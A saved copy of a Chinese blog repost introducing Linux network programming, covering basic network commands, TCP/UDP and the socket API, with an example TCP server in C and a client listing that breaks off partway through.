@@ -1,0 +1,1051 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Linux网络编程入门 (转载) - 独奏者 - 博客园</title>
+<link type="text/css" rel="stylesheet" href="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/common.css">
+<link id="MainCss" type="text/css" rel="stylesheet" href="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/style.css">
+<link type="text/css" rel="stylesheet" href="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/common2.css">
+<link type="text/css" rel="stylesheet" href="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/shStyle.css">
+<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/duzouzhe/rss">
+<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/duzouzhe/rsd.xml">
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/duzouzhe/wlwmanifest.xml">
+<script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/gpt.js" type="text/javascript" async=""></script><script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/ga.js" async="" type="text/javascript"></script><script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/jquery.js" type="text/javascript"></script>  
+<script type="text/javascript">
+var currentBlogApp = 'duzouzhe';
+</script>
+<script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/common.js" type="text/javascript"></script> 
+<script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/json2_002.js" type="text/javascript"></script><script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/json2.js" type="text/javascript"></script><script type="text/javascript" src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/floating-frame.js"></script>
+<script type="text/javascript" src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/syntaxHighlighter.js"></script>
+<style>@media print{#zdxakps9xm{display:none}}</style><script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/google_ads_gpt.js" type="text/javascript" async=""></script><script src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/osd.js" type="text/javascript"></script></head>
+<body>
+<a name="top"></a>
+
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+	<a id="lnkBlogLogo" href="http://www.cnblogs.com/duzouzhe/"><img id="blogLogo" src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/logo.gif" alt="返回主页"></a>			
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle" href="http://www.cnblogs.com/duzouzhe/">独奏</a></h1>
+<h2></h2>
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+	<li><a id="MyLinks1_HomeLink" class="menu" href="http://www.cnblogs.com/">博客园</a></li>
+	<li><a id="MyLinks1_MyHomeLink" class="menu" href="http://www.cnblogs.com/duzouzhe/">首页</a></li>
+	<li><a href="http://news.cnblogs.com/">新闻</a></li>
+	<li><a id="MyLinks1_NewPostLink" class="menu" rel="nofollow" href="http://www.cnblogs.com/duzouzhe/admin/EditPosts.aspx?opt=1">新随笔</a></li>
+	<li><a id="MyLinks1_ContactLink" accesskey="9" class="menu" rel="nofollow" href="http://space.cnblogs.com/msg/send/%e7%8b%ac%e5%a5%8f%e8%80%85">联系</a></li>
+	<li><a id="MyLinks1_Admin" class="menu" rel="nofollow" href="http://www.cnblogs.com/duzouzhe/admin/EditPosts.aspx">管理</a></li>
+	<li><a id="MyLinks1_Syndication" class="menu" href="http://www.cnblogs.com/duzouzhe/rss">订阅</a>
+	<a id="MyLinks1_XMLLink" class="aHeaderXML" href="http://www.cnblogs.com/duzouzhe/rss"><img src="Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%20%28%E8%BD%AC%E8%BD%BD%29_files/rss.gif" alt="订阅"></a></li>
+</ul>
+
+
+		<div class="blogStats">
+			
+			
+<!--done-->
+随笔- 183&nbsp;
+文章- 0&nbsp;
+评论- 19&nbsp;
+
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		
+	
+<!--done-->
+<div id="topics">
+	<div class="post">
+		<h1 class="postTitle">
+			<a id="cb_post_title_url" class="postTitle2" href="http://www.cnblogs.com/duzouzhe/archive/2009/06/19/1506699.html">Linux网络编程入门 (转载)</a>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body"><p>(一)Linux网络编程--网络知识介绍</p>
+<p>Linux网络编程--网络知识介绍<br>客户端和服务端 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网络程序和普通的程序有一个最大的区别是网络程序是由两个部分组成的--客户端和服务器端. </p>
+<p>客户端<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在网络程序中，如果一个程序主动和外面的程序通信，那么我们把这个程序称为客户端程序。 比如我们使用ftp程序从另外一<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 个地方获取文件的时候，是我们的ftp程序主动同外面进行通信（获取文件）， 所以这个地方我们的ftp程序就是客户端程序。 <br>服务端<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 和客户端相对应的程序即为服务端程序。被动的等待外面的程序来和自己通讯的程序称为服务端程序。 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 比如上面的文件获取中，另外一个地方的程序就是服务端，我们从服务端获取文件过来。 <br>互为客户和服务端<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实际生活中有些程序是互为服务和客户端。在这种情况项目， 一个程序既为客户端也是服务端。 </p>
+<p>常用的命令 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 由于网络程序是有两个部分组成,所以在调试的时候比较麻烦,为此我们有必要知道一些常用的网络命令 <br>netstat <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 命令netstat是用来显示网络的连接,路由表和接口统计等网络的信息.netstat有许多的选项. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我们常用的选项是-na 用来显示详细的网络状态.至于其它的选项我们可以使用帮助手册获得详细的情况. <br>telnet <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; telnet是一个用来登录远程的程序,但是我们完全可以用这个程序来调试我们的服务端程序的. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 比如我们的服务器程序在监听8888端口,我们可以用<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; telnet localhost 8888<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 来查看服务端的状况. <br>pingping 程序用来判断网络的状态是否正常，最经常的一个用法是<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ping 192.168.0.1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 表示我们想查看到192.168.0.1的硬件连接是否正常 <br>TCP/UDP介绍 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TCP(Transfer Control Protocol)传输控制协议是一种面向连接的协议, 当我们的网络程序使用这个协议的时候,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网络可以保证我们的客户端和服务端的连接是可靠的,安全的. </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP(User Datagram Protocol)用户数据报协议是一种非面向连接的协议, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这种协议并不能保证我们的网络程序的连接是可靠的,所以我们现在编写的程序一般是采用TCP协议的.</p>
+<p>&nbsp;</p>
+<p>(二)Linux网络编程--初等网络函数介绍（TCP）</p>
+<p>&nbsp;&nbsp; Linux系统是通过提供套接字(socket)来进行网络编程的.网络程序通过socket和其它几个函数的调用,<br>&nbsp;&nbsp; 会返回一个 通讯的文件描述符,我们可以将这个描述符看成普通的文件的描述符来操作,这就是linux的设备无关性的好处.<br>&nbsp;&nbsp; 我们可以通过向描述符读写操作实现网络之间的数据交流. <br>(一)socket <br>&nbsp; <br>&nbsp; int socket(int domain, int type,int protocol) </p>
+<p>&nbsp; domain:说明我们网络程序所在的主机采用的通讯协族(AF_UNIX和AF_INET等). <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AF_UNIX只能够用于单一的Unix 系统进程间通信,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 而AF_INET是针对Internet的,因而可以允许在远程 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 主机之间通信(当我们 man socket时发现 domain可选项是 PF_*而不是AF_*,因为glibc是posix的实现所以用PF代替了AF,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不过我们都可以使用的). </p>
+<p>&nbsp; type:我们网络程序所采用的通讯协议(SOCK_STREAM,SOCK_DGRAM等) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_STREAM表明我们用的是TCP 协议,这样会提供按顺序的,可靠,双向,面向连接的比特流. <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SOCK_DGRAM 表明我们用的是UDP协议,这样只会提供定长的,不可靠,无连接的通信. </p>
+<p>&nbsp; protocol:由于我们指定了type,所以这个地方我们一般只要用0来代替就可以了 socket为网络通讯做基本的准备.<br>&nbsp; 成功时返回文件描述符,失败时返回-1,看errno可知道出错的详细情况. </p>
+<p><br>(二)bind <br>&nbsp; int bind(int sockfd, struct sockaddr *my_addr, int addrlen) </p>
+<p>&nbsp; sockfd:是由socket调用返回的文件描述符. </p>
+<p>&nbsp; addrlen:是sockaddr结构的长度. </p>
+<p>&nbsp; my_addr:是一个指向sockaddr的指针. 在中有 sockaddr的定义 </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unisgned short&nbsp; as_family;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+sa_data[14];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };</p>
+<p>&nbsp; 不过由于系统的兼容性,我们一般不用这个头文件,而使用另外一个结构(struct sockaddr_in) 来代替.在中有sockaddr_in的定义 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ unsigned short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+sin_family;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ unsigned short int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_port;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ struct in_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+sin_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ unsigned 
+char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+sin_zero[8];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp; 我们主要使用Internet所以<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_family一般为AF_INET,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_addr设置为INADDR_ANY表示可以和任何的主机通信,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_port是我们要监听的端口号.sin_zero[8]是用来填充的. <br>&nbsp; bind将本地的端口同socket返回的文件描述符捆绑在一起.成功是返回0,失败的情况和socket一样 </p>
+<p>(三)listen <br>&nbsp; int listen(int sockfd,int backlog) </p>
+<p>&nbsp; sockfd:是bind后的文件描述符. </p>
+<p>&nbsp; backlog:设置请求排队的最大长度.当有多个客户端程序和服务端相连时, 使用这个表示可以介绍的排队长度. <br>&nbsp; listen函数将bind的文件描述符变为监听套接字.返回的情况和bind一样. </p>
+<p><br>(四)accept <br>&nbsp; int accept(int sockfd, struct sockaddr *addr,int *addrlen) </p>
+<p>&nbsp; sockfd:是listen后的文件描述符. </p>
+<p>&nbsp; addr,addrlen是用来给客户端的程序填写的,服务器端只要传递指针就可以了. bind,listen和accept是服务器端用的函数,<br>&nbsp; accept调用时,服务器端的程序会一直阻塞到有一个 客户程序发出了连接. accept成功时返回最后的服务器端的文件描述符,<br>&nbsp; 这个时候服务器端可以向该描述符写信息了. 失败时返回-1 </p>
+<p>(五)connect <br>&nbsp;&nbsp; int connect(int sockfd, struct sockaddr * serv_addr,int addrlen) </p>
+<p>&nbsp;&nbsp; sockfd:socket返回的文件描述符. </p>
+<p>&nbsp;&nbsp; serv_addr:储存了服务器端的连接信息.其中sin_add是服务端的地址 </p>
+<p>&nbsp;&nbsp; addrlen:serv_addr的长度 </p>
+<p>&nbsp;&nbsp; connect函数是客户端用来同服务端连接的.成功时返回0,sockfd是同服务端通讯的文件描述符 失败时返回-1. </p>
+<p>(六)实例 </p>
+<p>服务器端程序</p>
+<p>CODE:&nbsp; [Copy to clipboard]</p>
+<p><br>--------------------------------------------------------------------------------</p>
+<p>/******* 服务器程序&nbsp; (server.c) ************/<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;</p>
+<p>int main(int argc, char *argv[])<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockfd,new_fd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in server_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in client_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sin_size,portnumber;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char hello[]="Hello! Are You Fine?\n";</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc!=2)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((portnumber=atoi(argv[1]))&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 服务器端开始建立socket描述符 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Socket error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 服务器端填充 sockaddr结构&nbsp; */ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(&amp;server_addr,sizeof(struct sockaddr_in));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_family=AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_addr.s_addr=htonl(INADDR_ANY);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_port=htons(portnumber);</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 捆绑sockfd描述符&nbsp; */ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(bind(sockfd,(struct sockaddr *)(&amp;server_addr),sizeof(struct sockaddr))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Bind error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 监听sockfd描述符&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(listen(sockfd,5)==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Listen error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 服务器阻塞,直到客户程序建立连接&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin_size=sizeof(struct sockaddr_in);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ if((new_fd=accept(sockfd,(struct sockaddr 
+*)(&amp;client_addr),&amp;sin_size))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Accept error:%s\n\a",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Server get connection from %s\n",<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inet_ntoa(client_addr.sin_addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ if(write(new_fd,hello,strlen(hello))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Write Error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 这个通讯已经结束&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(new_fd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 循环下一个&nbsp;&nbsp;&nbsp;&nbsp; */&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sockfd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<br>}</p>
+<p>客户端程序</p>
+<p>CODE:&nbsp; [Copy to clipboard]</p>
+<p><br>--------------------------------------------------------------------------------</p>
+<p>/******* 客户端程序&nbsp; client.c ************/<br>/******* 客户端程序&nbsp; client.c ************/<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;</p>
+<p>int main(int argc, char *argv[])<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int sockfd;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buffer[1024];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in server_addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct hostent *host;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int portnumber,nbytes;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc!=3)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((host=gethostbyname(argv[1]))==NULL)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
